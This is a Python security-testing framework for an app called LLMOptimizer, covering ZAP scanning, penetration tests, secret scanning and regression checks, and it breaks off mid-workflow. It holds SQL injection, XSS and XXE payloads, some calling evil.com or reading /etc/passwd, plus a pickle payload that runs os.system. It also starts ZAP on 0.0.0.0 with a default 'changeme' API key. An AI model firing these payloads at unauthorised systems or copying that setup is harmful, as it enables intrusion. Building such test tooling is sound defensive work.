"""
Security Testing Framework for LLMOptimizer.
Implements automated security testing including OWASP ZAP integration,
penetration testing, vulnerability scanning, and security regression tests.
"""

import os
import json
import asyncio
import subprocess
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import yaml
import requests
from zapv2 import ZAPv2
import pytest
import logging
from pathlib import Path
import hashlib
import jwt
import ssl
import socket
from concurrent.futures import ThreadPoolExecutor
import nmap
import bandit
from safety import check

logger = logging.getLogger(__name__)


@dataclass
class SecurityTestResult:
    """Security test result data structure."""
    test_name: str
    status: str  # passed, failed, warning
    severity: str  # critical, high, medium, low, info
    description: str
    remediation: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None


class OWASPZAPScanner:
    """OWASP ZAP integration for automated security testing."""
    
    def __init__(self, proxy_host: str = 'localhost', proxy_port: int = 8080):
        self.zap = ZAPv2(proxies={'http': f'http://{proxy_host}:{proxy_port}',
                                  'https': f'http://{proxy_host}:{proxy_port}'})
        self.target_url = None
        self.api_key = os.getenv('ZAP_API_KEY', 'changeme')
    
    async def start_zap_daemon(self):
        """Start ZAP in daemon mode."""
        try:
            cmd = [
                'zap.sh', '-daemon',
                '-host', '0.0.0.0',
                '-port', '8080',
                '-config', 'api.key=' + self.api_key,
                '-config', 'api.addrs.addr.name=.*',
                '-config', 'api.addrs.addr.regex=true'
            ]
            subprocess.Popen(cmd)
            await asyncio.sleep(30)  # Wait for ZAP to start
            logger.info("ZAP daemon started successfully")
        except Exception as e:
            logger.error(f"Failed to start ZAP daemon: {e}")
            raise
    
    async def spider_scan(self, target_url: str) -> List[str]:
        """Perform spider scan to discover URLs."""
        self.target_url = target_url
        logger.info(f"Starting spider scan on {target_url}")
        
        scan_id = self.zap.spider.scan(target_url, apikey=self.api_key)
        
        # Wait for spider to complete
        while int(self.zap.spider.status(scan_id)) < 100:
            await asyncio.sleep(2)
            progress = self.zap.spider.status(scan_id)
            logger.info(f"Spider progress: {progress}%")
        
        urls = self.zap.spider.results(scan_id)
        logger.info(f"Spider scan completed. Found {len(urls)} URLs")
        return urls
    
    async def active_scan(self, target_url: str) -> str:
        """Perform active security scan."""
        logger.info(f"Starting active scan on {target_url}")
        
        scan_id = self.zap.ascan.scan(target_url, apikey=self.api_key)
        
        # Wait for active scan to complete
        while int(self.zap.ascan.status(scan_id)) < 100:
            await asyncio.sleep(5)
            progress = self.zap.ascan.status(scan_id)
            logger.info(f"Active scan progress: {progress}%")
        
        logger.info("Active scan completed")
        return scan_id
    
    async def passive_scan(self) -> List[Dict[str, Any]]:
        """Get passive scan results."""
        # Wait for passive scan to complete
        while int(self.zap.pscan.records_to_scan) > 0:
            await asyncio.sleep(2)
            logger.info(f"Passive scan records remaining: {self.zap.pscan.records_to_scan}")
        
        alerts = self.zap.core.alerts(baseurl=self.target_url)
        return alerts
    
    def get_scan_results(self) -> List[SecurityTestResult]:
        """Convert ZAP alerts to SecurityTestResult objects."""
        alerts = self.zap.core.alerts()
        results = []
        
        severity_mapping = {
            'High': 'high',
            'Medium': 'medium',
            'Low': 'low',
            'Informational': 'info'
        }
        
        for alert in alerts:
            result = SecurityTestResult(
                test_name=f"OWASP ZAP: {alert['name']}",
                status='failed' if alert['risk'] in ['High', 'Medium'] else 'warning',
                severity=severity_mapping.get(alert['risk'], 'info'),
                description=alert['description'],
                remediation=alert['solution'],
                evidence={
                    'url': alert['url'],
                    'param': alert.get('param', ''),
                    'attack': alert.get('attack', ''),
                    'evidence': alert.get('evidence', ''),
                    'reference': alert.get('reference', '')
                },
                cwe_id=alert.get('cweid'),
                owasp_category=alert.get('wascid')
            )
            results.append(result)
        
        return results
    
    async def run_full_scan(self, target_url: str) -> List[SecurityTestResult]:
        """Run complete OWASP ZAP scan."""
        # Spider scan
        await self.spider_scan(target_url)
        
        # Active scan
        await self.active_scan(target_url)
        
        # Get passive scan results
        await self.passive_scan()
        
        # Get all results
        return self.get_scan_results()


class PenetrationTester:
    """Automated penetration testing suite."""
    
    def __init__(self):
        self.target_host = None
        self.results = []
    
    async def test_sql_injection(self, url: str, params: Dict[str, str]) -> SecurityTestResult:
        """Test for SQL injection vulnerabilities."""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "\" OR 1=1 --",
            "' UNION SELECT NULL, NULL, NULL--",
            "1' AND '1'='2",
            "admin'--",
            "' OR 'x'='x",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+"
        ]
        
        vulnerable = False
        evidence = {}
        
        for param, value in params.items():
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = requests.get(url, params=test_params, timeout=10)
                    
                    # Check for SQL error messages
                    error_patterns = [
                        'SQL syntax',
                        'mysql_fetch',
                        'ORA-01756',
                        'PostgreSQL',
                        'SQLServer',
                        'sqlite_error',
                        'database error',
                        'syntax error'
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            vulnerable = True
                            evidence[param] = {
                                'payload': payload,
                                'error': pattern,
                                'response_snippet': response.text[:500]
                            }
                            break
                    
                    # Check for timing attacks
                    time_payload = f"{value}' AND SLEEP(5)--"
                    test_params[param] = time_payload
                    start_time = datetime.now()
                    response = requests.get(url, params=test_params, timeout=15)
                    elapsed = (datetime.now() - start_time).total_seconds()
                    
                    if elapsed > 4.5:  # Likely vulnerable to time-based SQL injection
                        vulnerable = True
                        evidence[param] = {
                            'payload': time_payload,
                            'timing': elapsed,
                            'type': 'time-based blind SQL injection'
                        }
                
                except requests.exceptions.Timeout:
                    # Timeout might indicate time-based SQL injection
                    vulnerable = True
                    evidence[param] = {
                        'payload': payload,
                        'type': 'possible time-based SQL injection'
                    }
                except Exception as e:
                    logger.error(f"Error testing SQL injection: {e}")
        
        return SecurityTestResult(
            test_name="SQL Injection Test",
            status='failed' if vulnerable else 'passed',
            severity='critical' if vulnerable else 'info',
            description="SQL injection vulnerability test" if not vulnerable else 
                       "SQL injection vulnerability detected",
            remediation="Use parameterized queries and input validation",
            evidence=evidence,
            cwe_id="CWE-89",
            owasp_category="A03:2021"
        )
    
    async def test_xss(self, url: str, params: Dict[str, str]) -> SecurityTestResult:
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<IMG SRC="javascript:alert(\'XSS\');">',
            '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>'
        ]
        
        vulnerable = False
        evidence = {}
        
        for param, value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = requests.get(url, params=test_params, timeout=10)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        # Check if it's properly encoded
                        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                        if encoded_payload not in response.text:
                            vulnerable = True
                            evidence[param] = {
                                'payload': payload,
                                'reflected': True,
                                'response_snippet': response.text[
                                    max(0, response.text.find(payload) - 50):
                                    response.text.find(payload) + 50 + len(payload)
                                ]
                            }
                
                except Exception as e:
                    logger.error(f"Error testing XSS: {e}")
        
        return SecurityTestResult(
            test_name="Cross-Site Scripting (XSS) Test",
            status='failed' if vulnerable else 'passed',
            severity='high' if vulnerable else 'info',
            description="XSS vulnerability test" if not vulnerable else 
                       "XSS vulnerability detected",
            remediation="Encode all user input before displaying, use Content Security Policy",
            evidence=evidence,
            cwe_id="CWE-79",
            owasp_category="A03:2021"
        )
    
    async def test_authentication_bypass(self, login_url: str) -> SecurityTestResult:
        """Test for authentication bypass vulnerabilities."""
        bypass_techniques = [
            # SQL injection in login
            {'username': "admin' --", 'password': 'anything'},
            {'username': "' OR '1'='1", 'password': "' OR '1'='1"},
            # NoSQL injection
            {'username': {'$ne': None}, 'password': {'$ne': None}},
            # LDAP injection
            {'username': '*', 'password': '*'},
            {'username': 'admin)(&(password=*))', 'password': '*'},
            # Default credentials
            {'username': 'admin', 'password': 'admin'},
            {'username': 'administrator', 'password': 'password'},
            {'username': 'root', 'password': 'root'},
            {'username': 'test', 'password': 'test'}
        ]
        
        vulnerable = False
        evidence = {}
        
        for technique in bypass_techniques:
            try:
                response = requests.post(login_url, json=technique, timeout=10)
                
                # Check for successful login indicators
                success_indicators = [
                    'dashboard', 'welcome', 'logout',
                    'token', 'session', 'authenticated'
                ]
                
                for indicator in success_indicators:
                    if indicator in response.text.lower() or \
                       indicator in response.headers.get('Location', '').lower():
                        vulnerable = True
                        evidence['bypass_technique'] = technique
                        evidence['indicator'] = indicator
                        break
                
                # Check status codes
                if response.status_code in [200, 302] and 'login' not in response.url:
                    vulnerable = True
                    evidence['bypass_technique'] = technique
                    evidence['status_code'] = response.status_code
            
            except Exception as e:
                logger.error(f"Error testing authentication bypass: {e}")
        
        return SecurityTestResult(
            test_name="Authentication Bypass Test",
            status='failed' if vulnerable else 'passed',
            severity='critical' if vulnerable else 'info',
            description="Authentication bypass test" if not vulnerable else 
                       "Authentication bypass vulnerability detected",
            remediation="Implement secure authentication, use prepared statements, validate input",
            evidence=evidence,
            cwe_id="CWE-287",
            owasp_category="A07:2021"
        )
    
    async def test_xxe_injection(self, url: str) -> SecurityTestResult:
        """Test for XML External Entity (XXE) injection."""
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <data>&xxe;</data>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
            <data>&xxe;</data>''',
            
            '''<?xml version="1.0"?>
            <!DOCTYPE data [
            <!ELEMENT data ANY>
            <!ENTITY file SYSTEM "file:///etc/hosts">
            ]>
            <data>&file;</data>'''
        ]
        
        vulnerable = False
        evidence = {}
        
        headers = {'Content-Type': 'application/xml'}
        
        for payload in xxe_payloads:
            try:
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for file content in response
                if '/etc/passwd' in payload and 'root:' in response.text:
                    vulnerable = True
                    evidence['payload'] = payload
                    evidence['leaked_data'] = response.text[:500]
                
                # Check for error messages indicating XXE
                xxe_errors = [
                    'external entity', 'DOCTYPE', 'ENTITY',
                    'xml parsing error', 'xmlParseEntityRef'
                ]
                
                for error in xxe_errors:
                    if error.lower() in response.text.lower():
                        evidence['error'] = error
                        evidence['payload'] = payload
            
            except Exception as e:
                logger.error(f"Error testing XXE: {e}")
        
        return SecurityTestResult(
            test_name="XML External Entity (XXE) Test",
            status='failed' if vulnerable else 'passed',
            severity='critical' if vulnerable else 'info',
            description="XXE injection test" if not vulnerable else 
                       "XXE injection vulnerability detected",
            remediation="Disable XML external entity processing, use JSON instead of XML",
            evidence=evidence,
            cwe_id="CWE-611",
            owasp_category="A05:2021"
        )
    
    async def test_insecure_deserialization(self, url: str) -> SecurityTestResult:
        """Test for insecure deserialization vulnerabilities."""
        # This is a simplified test - real testing would be more complex
        vulnerable = False
        evidence = {}
        
        # Test Java deserialization
        java_payload = b'\xac\xed\x00\x05'  # Java serialization magic bytes
        
        # Test Python pickle
        import pickle
        class MaliciousClass:
            def __reduce__(self):
                return (os.system, ('echo vulnerable',))
        
        try:
            pickle_payload = pickle.dumps(MaliciousClass())
            
            # Test various content types
            tests = [
                ('application/x-java-serialized-object', java_payload),
                ('application/x-python-pickle', pickle_payload),
                ('application/octet-stream', java_payload)
            ]
            
            for content_type, payload in tests:
                headers = {'Content-Type': content_type}
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for deserialization errors or success
                if response.status_code == 500:
                    error_indicators = [
                        'deserialization', 'unpickle', 'unserialize',
                        'objectinputstream', 'readobject'
                    ]
                    
                    for indicator in error_indicators:
                        if indicator in response.text.lower():
                            vulnerable = True
                            evidence['content_type'] = content_type
                            evidence['error'] = indicator
        
        except Exception as e:
            logger.error(f"Error testing insecure deserialization: {e}")
        
        return SecurityTestResult(
            test_name="Insecure Deserialization Test",
            status='failed' if vulnerable else 'passed',
            severity='critical' if vulnerable else 'info',
            description="Insecure deserialization test" if not vulnerable else 
                       "Insecure deserialization vulnerability detected",
            remediation="Avoid deserializing untrusted data, use JSON for data exchange",
            evidence=evidence,
            cwe_id="CWE-502",
            owasp_category="A08:2021"
        )
    
    async def run_all_tests(self, target_url: str) -> List[SecurityTestResult]:
        """Run all penetration tests."""
        results = []
        
        # Parse URL for testing
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        
        # Convert params to simple dict
        simple_params = {k: v[0] if v else '' for k, v in params.items()}
        
        # Run tests
        if simple_params:
            results.append(await self.test_sql_injection(base_url, simple_params))
            results.append(await self.test_xss(base_url, simple_params))
        
        # Test authentication endpoint if available
        login_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/login"
        results.append(await self.test_authentication_bypass(login_url))
        
        # Test data endpoints
        data_url = f"{parsed.scheme}://{parsed.netloc}/api/data"
        results.append(await self.test_xxe_injection(data_url))
        results.append(await self.test_insecure_deserialization(data_url))
        
        return results


class VulnerabilityScanner:
    """Dependency and code vulnerability scanner."""
    
    def __init__(self):
        self.project_root = Path.cwd()
    
    async def scan_dependencies(self) -> List[SecurityTestResult]:
        """Scan Python dependencies for known vulnerabilities."""
        results = []
        
        # Use safety to check dependencies
        try:
            # Read requirements files
            req_files = list(self.project_root.glob('**/requirements*.txt'))
            
            for req_file in req_files:
                vulnerabilities = check.check(req_file)
                
                for vuln in vulnerabilities:
                    result = SecurityTestResult(
                        test_name=f"Dependency Vulnerability: {vuln.package_name}",
                        status='failed',
                        severity=self._map_severity(vuln.severity),
                        description=f"{vuln.package_name} {vuln.installed_version} has known vulnerability: {vuln.vulnerability_id}",
                        remediation=f"Update to {vuln.secure_version}",
                        evidence={
                            'package': vuln.package_name,
                            'installed_version': vuln.installed_version,
                            'secure_version': vuln.secure_version,
                            'vulnerability_id': vuln.vulnerability_id,
                            'cve': vuln.cve
                        },
                        cwe_id="CWE-1104"
                    )
                    results.append(result)
        
        except Exception as e:
            logger.error(f"Error scanning dependencies: {e}")
        
        return results
    
    async def scan_code_security(self) -> List[SecurityTestResult]:
        """Scan code for security issues using bandit."""
        results = []
        
        try:
            # Run bandit on Python files
            from bandit.core import manager as bandit_manager
            
            b_mgr = bandit_manager.BanditManager()
            b_mgr.discover_files([str(self.project_root)])
            b_mgr.run_tests()
            
            for issue in b_mgr.get_issue_list():
                result = SecurityTestResult(
                    test_name=f"Code Security: {issue.test}",
                    status='failed' if issue.severity in ['HIGH', 'MEDIUM'] else 'warning',
                    severity=issue.severity.lower(),
                    description=issue.text,
                    remediation=issue.remediation,
                    evidence={
                        'file': issue.fname,
                        'line': issue.lineno,
                        'code': issue.code,
                        'confidence': issue.confidence
                    },
                    cwe_id=issue.cwe
                )
                results.append(result)
        
        except Exception as e:
            logger.error(f"Error scanning code: {e}")
        
        return results
    
    async def scan_secrets(self) -> List[SecurityTestResult]:
        """Scan for hardcoded secrets and credentials."""
        results = []
        
        secret_patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'(?i)aws(.{0,20})?(?-i)[0-9a-zA-Z\/\+]{40}',
            'API Key': r'(?i)api[_\-\s]?key[_\-\s]?[:=][_\-\s]?["\']?[0-9a-zA-Z]{32,}["\']?',
            'Private Key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            'JWT Token': r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',
            'Database URL': r'(?i)(postgres|mysql|mongodb):\/\/[^:]+:[^@]+@[^\/]+\/\w+',
            'Password': r'(?i)password[_\-\s]?[:=][_\-\s]?["\']?[^\s"\']{8,}["\']?'
        }
        
        # Scan all text files
        for file_path in self.project_root.rglob('*'):
            if file_path.is_file() and file_path.suffix in ['.py', '.js', '.yml', '.yaml', '.json', '.env', '.config']:
                try:
                    content = file_path.read_text()
                    
                    for secret_type, pattern in secret_patterns.items():
                        import re
                        matches = re.finditer(pattern, content)
                        
                        for match in matches:
                            # Get line number
                            line_num = content[:match.start()].count('\n') + 1
                            
                            result = SecurityTestResult(
                                test_name=f"Hardcoded Secret: {secret_type}",
                                status='failed',
                                severity='high',
                                description=f"Potential {secret_type} found in code",
                                remediation="Use environment variables or secure key management service",
                                evidence={
                                    'file': str(file_path),
                                    'line': line_num,
                                    'pattern': secret_type,
                                    'match_preview': match.group()[:50] + '...'
                                },
                                cwe_id="CWE-798"
                            )
                            results.append(result)
                
                except Exception as e:
                    logger.error(f"Error scanning file {file_path}: {e}")
        
        return results
    
    def _map_severity(self, safety_severity: str) -> str:
        """Map safety severity to our severity levels."""
        mapping = {
            'CRITICAL': 'critical',
            'HIGH': 'high',
            'MEDIUM': 'medium',
            'LOW': 'low',
            'UNKNOWN': 'info'
        }
        return mapping.get(safety_severity.upper(), 'info')
    
    async def run_all_scans(self) -> List[SecurityTestResult]:
        """Run all vulnerability scans."""
        results = []
        results.extend(await self.scan_dependencies())
        results.extend(await self.scan_code_security())
        results.extend(await self.scan_secrets())
        return results


class SecurityRegressionTester:
    """Security regression testing to ensure fixes remain in place."""
    
    def __init__(self):
        self.baseline_file = Path('security_baseline.json')
        self.regression_tests = []
    
    def load_baseline(self) -> Dict[str, Any]:
        """Load security baseline from file."""
        if self.baseline_file.exists():
            with open(self.baseline_file, 'r') as f:
                return json.load(f)
        return {}
    
    def save_baseline(self, results: List[SecurityTestResult]):
        """Save current results as baseline."""
        baseline = {
            'timestamp': datetime.now().isoformat(),
            'tests': [
                {
                    'test_name': r.test_name,
                    'status': r.status,
                    'severity': r.severity,
                    'hash': hashlib.sha256(
                        f"{r.test_name}{r.status}{r.severity}".encode()
                    ).hexdigest()
                }
                for r in results if r.status == 'passed'
            ]
        }
        
        with open(self.baseline_file, 'w') as f:
            json.dump(baseline, f, indent=2)
    
    async def test_security_headers(self, url: str) -> List[SecurityTestResult]:
        """Test for required security headers."""
        results = []
        
        required_headers = {
            'Strict-Transport-Security': {
                'required': True,
                'expected': 'max-age=31536000; includeSubDomains',
                'severity': 'high'
            },
            'X-Content-Type-Options': {
                'required': True,
                'expected': 'nosniff',
                'severity': 'medium'
            },
            'X-Frame-Options': {
                'required': True,
                'expected': 'DENY',
                'severity': 'medium'
            },
            'Content-Security-Policy': {
                'required': True,
                'expected': "default-src 'self'",
                'severity': 'high'
            },
            'X-XSS-Protection': {
                'required': False,  # Deprecated but still check
                'expected': '1; mode=block',
                'severity': 'low'
            },
            'Referrer-Policy': {
                'required': True,
                'expected': 'strict-origin-when-cross-origin',
                'severity': 'low'
            },
            'Permissions-Policy': {
                'required': True,
                'expected': 'geolocation=(), microphone=(), camera=()',
                'severity': 'medium'
            }
        }
        
        try:
            response = requests.get(url, timeout=10)
            
            for header, config in required_headers.items():
                header_value = response.headers.get(header)
                
                if config['required'] and not header_value:
                    result = SecurityTestResult(
                        test_name=f"Security Header: {header}",
                        status='failed',
                        severity=config['severity'],
                        description=f"Missing required security header: {header}",
                        remediation=f"Add header: {header}: {config['expected']}",
                        evidence={'url': url, 'headers': dict(response.headers)}
                    )
                    results.append(result)
                elif header_value and config['expected'] not in header_value:
                    result = SecurityTestResult(
                        test_name=f"Security Header: {header}",
                        status='warning',
                        severity=config['severity'],
                        description=f"Security header {header} has unexpected value",
                        remediation=f"Expected: {config['expected']}, Got: {header_value}",
                        evidence={'url': url, 'header_value': header_value}
                    )
                    results.append(result)
                else:
                    result = SecurityTestResult(
                        test_name=f"Security Header: {header}",
                        status='passed',
                        severity='info',
                        description=f"Security header {header} correctly configured",
                        remediation="",
                        evidence={'header_value': header_value}
                    )
                    results.append(result)
        
        except Exception as e:
            logger.error(f"Error testing security headers: {e}")
        
        return results
    
    async def test_tls_configuration(self, host: str, port: int = 443) -> SecurityTestResult:
        """Test TLS/SSL configuration."""
        try:
            context = ssl.create_default_context()
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    # Get certificate info
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    issues = []
                    
                    # Check TLS version
                    if version in ['TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3']:
                        issues.append(f"Insecure TLS version: {version}")
                    
                    # Check cipher strength
                    if cipher and cipher[2] < 128:
                        issues.append(f"Weak cipher strength: {cipher[2]} bits")
                    
                    # Check certificate expiration
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (not_after - datetime.now()).days
                    
                    if days_until_expiry < 30:
                        issues.append(f"Certificate expires in {days_until_expiry} days")
                    
                    # Check certificate chain
                    if 'subjectAltName' not in cert:
                        issues.append("Certificate missing Subject Alternative Name")
                    
                    return SecurityTestResult(
                        test_name="TLS Configuration Test",
                        status='failed' if issues else 'passed',
                        severity='high' if issues else 'info',
                        description="TLS configuration issues found" if issues else "TLS properly configured",
                        remediation="; ".join(issues) if issues else "",
                        evidence={
                            'host': host,
                            'port': port,
                            'tls_version': version,
                            'cipher': cipher,
                            'cert_issuer': cert.get('issuer'),
                            'cert_expires': cert.get('notAfter'),
                            'days_until_expiry': days_until_expiry
                        }
                    )
        
        except Exception as e:
            return SecurityTestResult(
                test_name="TLS Configuration Test",
                status='failed',
                severity='critical',
                description=f"Failed to test TLS configuration: {str(e)}",
                remediation="Ensure TLS is properly configured and accessible",
                evidence={'error': str(e)}
            )
    
    async def test_session_security(self, base_url: str) -> List[SecurityTestResult]:
        """Test session management security."""
        results = []
        
        # Test session fixation
        session = requests.Session()
        
        # Get initial session
        response = session.get(f"{base_url}/api/auth/session")
        initial_session_id = session.cookies.get('session_id')
        
        # Attempt login
        login_data = {'username': 'testuser', 'password': 'testpass'}
        session.post(f"{base_url}/api/auth/login", json=login_data)
        
        # Check if session ID changed after login
        new_session_id = session.cookies.get('session_id')
        
        if initial_session_id and initial_session_id == new_session_id:
            results.append(SecurityTestResult(
                test_name="Session Fixation Test",
                status='failed',
                severity='high',
                description="Session ID does not change after authentication",
                remediation="Regenerate session ID after successful authentication",
                evidence={
                    'initial_session': initial_session_id,
                    'post_auth_session': new_session_id
                },
                cwe_id="CWE-384"
            ))
        
        # Test session cookie security
        for cookie in session.cookies:
            if cookie.name == 'session_id':
                issues = []
                
                if not cookie.secure:
                    issues.append("Session cookie missing Secure flag")
                
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("Session cookie missing HttpOnly flag")
                
                if not cookie.has_nonstandard_attr('SameSite'):
                    issues.append("Session cookie missing SameSite attribute")
                
                if issues:
                    results.append(SecurityTestResult(
                        test_name="Session Cookie Security",
                        status='failed',
                        severity='medium',
                        description="; ".join(issues),
                        remediation="Set Secure, HttpOnly, and SameSite flags on session cookies",
                        evidence={'cookie_attributes': str(cookie)},
                        cwe_id="CWE-614"
                    ))
        
        return results
    
    async def run_regression_tests(self, target_url: str) -> Tuple[List[SecurityTestResult], bool]:
        """Run security regression tests."""
        results = []
        regression_passed = True
        
        # Load baseline
        baseline = self.load_baseline()
        
        # Run security tests
        parsed_url = requests.compat.urlparse(target_url)
        host = parsed_url.hostname
        
        results.extend(await self.test_security_headers(target_url))
        results.append(await self.test_tls_configuration(host))
        results.extend(await self.test_session_security(target_url))
        
        # Compare with baseline
        if baseline:
            baseline_tests = {t['hash']: t for t in baseline.get('tests', [])}
            
            for result in results:
                if result.status == 'passed':
                    test_hash = hashlib.sha256(
                        f"{result.test_name}{result.status}{result.severity}".encode()
                    ).hexdigest()
                    
                    if test_hash in baseline_tests:
                        # Test that was passing is still passing - good
                        continue
                else:
                    # Check if this test was passing in baseline
                    for baseline_test in baseline_tests.values():
                        if baseline_test['test_name'] == result.test_name:
                            # Regression detected - test was passing, now failing
                            regression_passed = False
                            result.description = f"REGRESSION: {result.description}"
                            result.severity = 'critical'
                            break
        
        # Save new baseline if all tests pass
        if all(r.status == 'passed' for r in results):
            self.save_baseline(results)
        
        return results, regression_passed


class SecurityTestOrchestrator:
    """Orchestrates all security tests and generates reports."""
    
    def __init__(self):
        self.zap_scanner = OWASPZAPScanner()
        self.pen_tester = PenetrationTester()
        self.vuln_scanner = VulnerabilityScanner()
        self.regression_tester = SecurityRegressionTester()
        self.results = []
    
    async def run_full_security_suite(self, target_url: str) -> Dict[str, Any]:
        """Run complete security test suite."""
        logger.info("Starting comprehensive security testing...")
        
        all_results = []
        test_summary = {
            'total_tests': 0,
            'passed': 0,
            'failed': 0,
            'warnings': 0,
            'critical_issues': 0,
            'high_issues': 0,
            'medium_issues': 0,
            'low_issues': 0
        }
        
        # Run OWASP ZAP scan
        logger.info("Running OWASP ZAP scan...")
        try:
            await self.zap_scanner.start_zap_daemon()
            zap_results = await self.zap_scanner.run_full_scan(target_url)
            all_results.extend(zap_results)
        except Exception as e:
            logger.error(f"ZAP scan failed: {e}")
        
        # Run penetration tests
        logger.info("Running penetration tests...")
        pen_test_results = await self.pen_tester.run_all_tests(target_url)
        all_results.extend(pen_test_results)
        
        # Run vulnerability scans
        logger.info("Running vulnerability scans...")
        vuln_results = await self.vuln_scanner.run_all_scans()
        all_results.extend(vuln_results)
        
        # Run regression tests
        logger.info("Running security regression tests...")
        regression_results, regression_passed = await self.regression_tester.run_regression_tests(target_url)
        all_results.extend(regression_results)
        
        # Calculate summary
        for result in all_results:
            test_summary['total_tests'] += 1
            
            if result.status == 'passed':
                test_summary['passed'] += 1
            elif result.status == 'failed':
                test_summary['failed'] += 1
            else:
                test_summary['warnings'] += 1
            
            if result.severity == 'critical':
                test_summary['critical_issues'] += 1
            elif result.severity == 'high':
                test_summary['high_issues'] += 1
            elif result.severity == 'medium':
                test_summary['medium_issues'] += 1
            elif result.severity == 'low':
                test_summary['low_issues'] += 1
        
        # Generate report
        report = {
            'timestamp': datetime.now().isoformat(),
            'target_url': target_url,
            'summary': test_summary,
            'regression_passed': regression_passed,
            'results': [
                {
                    'test_name': r.test_name,
                    'status': r.status,
                    'severity': r.severity,
                    'description': r.description,
                    'remediation': r.remediation,
                    'evidence': r.evidence,
                    'cwe_id': r.cwe_id,
                    'owasp_category': r.owasp_category,
                    'timestamp': r.timestamp.isoformat()
                }
                for r in all_results
            ]
        }
        
        # Save report
        report_file = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Security testing completed. Report saved to {report_file}")
        
        return report
    
    def generate_html_report(self, report: Dict[str, Any]) -> str:
        """Generate HTML report from test results."""
        html = f"""
        <html>
        <head>
            <title>Security Test Report - {report['timestamp']}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .summary {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .critical {{ color: #d32f2f; font-weight: bold; }}
                .high {{ color: #f57c00; font-weight: bold; }}
                .medium {{ color: #fbc02d; }}
                .low {{ color: #388e3c; }}
                .passed {{ color: #4caf50; }}
                .failed {{ color: #f44336; }}
                .warning {{ color: #ff9800; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
                tr:nth-child(even) {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <h1>Security Test Report</h1>
            <div class="summary">
                <h2>Summary</h2>
                <p><strong>Target:</strong> {report['target_url']}</p>
                <p><strong>Date:</strong> {report['timestamp']}</p>
                <p><strong>Total Tests:</strong> {report['summary']['total_tests']}</p>
                <p class="passed"><strong>Passed:</strong> {report['summary']['passed']}</p>
                <p class="failed"><strong>Failed:</strong> {report['summary']['failed']}</p>
                <p class="warning"><strong>Warnings:</strong> {report['summary']['warnings']}</p>
                <hr>
                <p class="critical">Critical Issues: {report['summary']['critical_issues']}</p>
                <p class="high">High Issues: {report['summary']['high_issues']}</p>
                <p class="medium">Medium Issues: {report['summary']['medium_issues']}</p>
                <p class="low">Low Issues: {report['summary']['low_issues']}</p>
                <p><strong>Regression Status:</strong> {'PASSED' if report['regression_passed'] else 'FAILED'}</p>
            </div>
            
            <h2>Detailed Results</h2>
            <table>
                <tr>
                    <th>Test Name</th>
                    <th>Status</th>
                    <th>Severity</th>
                    <th>Description</th>
                    <th>Remediation</th>
                </tr>
        """
        
        for result in report['results']:
            status_class = result['status']
            severity_class = result['severity']
            
            html += f"""
                <tr>
                    <td>{result['test_name']}</td>
                    <td class="{status_class}">{result['status'].upper()}</td>
                    <td class="{severity_class}">{result['severity'].upper()}</td>
                    <td>{result['description']}</td>
                    <td>{result['remediation']}</td>
                </tr>
            """
        
        html += """
            </table>
        </body>
        </html>
        """
        
        # Save HTML report
        html_file = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(html_file, 'w') as f:
            f.write(html)
        
        return html_file


# CI/CD Integration
class SecurityCICD:
    """Security testing integration for CI/CD pipelines."""
    
    @staticmethod
    def create_github_action() -> str:
        """Generate GitHub Action workflow for security testing."""
        workflow = """
name: Security Testing

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

